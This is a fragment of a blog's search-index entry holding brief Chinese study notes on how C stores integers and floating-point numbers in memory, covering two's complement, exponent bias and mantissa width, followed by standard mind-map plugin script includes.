    <content type="html"><![CDATA[<h1 id="周哥C语言之浮点数"><a href="#周哥C语言之浮点数" class="headerlink" title="周哥C语言之浮点数"></a>周哥C语言之浮点数</h1><p><strong>负数补码绝对值求反 再加1</strong></p><p><strong>定义的变量数值都以补码形式二进制存放在内存中</strong></p><p><strong>浮点数计算对应的二进制</strong></p><p><strong>单精度指数+127</strong></p><p><strong>双精度指数+1023</strong></p><p><strong>单精度23位 双精度 52位 余下的补0</strong>     </p><p><strong>%怕可以打印变量数值地址</strong></p><p><strong>为什么要用八个字节去查看 后面是以四个字节去查看</strong></p><p><strong>因为一个double占八个字节</strong></p><p><strong>而后面是float 占四个字节</strong> </p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.6.0/dist/mindmap.min.css">]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
